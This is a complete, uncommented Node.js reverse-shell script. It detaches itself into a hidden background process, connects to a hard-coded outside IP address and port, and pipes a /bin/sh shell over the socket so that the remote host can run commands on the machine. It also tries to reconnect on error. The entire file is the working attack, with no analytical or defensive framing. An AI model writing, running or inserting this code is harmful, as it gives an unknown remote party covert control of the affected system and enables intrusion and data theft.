#!/usr/bin/env node

var net = require('net');
var spawn = require('child_process').spawn;

if (!process.env.IS_CHILD) {
  spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: 'ignore',
    env: Object.assign({ IS_CHILD: "1" }, process.env)
  });
  process.exit(0);
}

var HOST, PORT, TIMEOUT;
HOST="3.141.210.37";
PORT="19895";
TIMEOUT="5000";

function c(HOST,PORT) {
  var client = new net.Socket();
  client.connect(PORT, HOST, function() {
    var sh = spawn('/bin/sh',[]);
    client.write("Connected\r\n");
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
  });
  client.on('error', function(e) {
    setTimeout(c(HOST,PORT), TIMEOUT);
  });
}

c(HOST,PORT);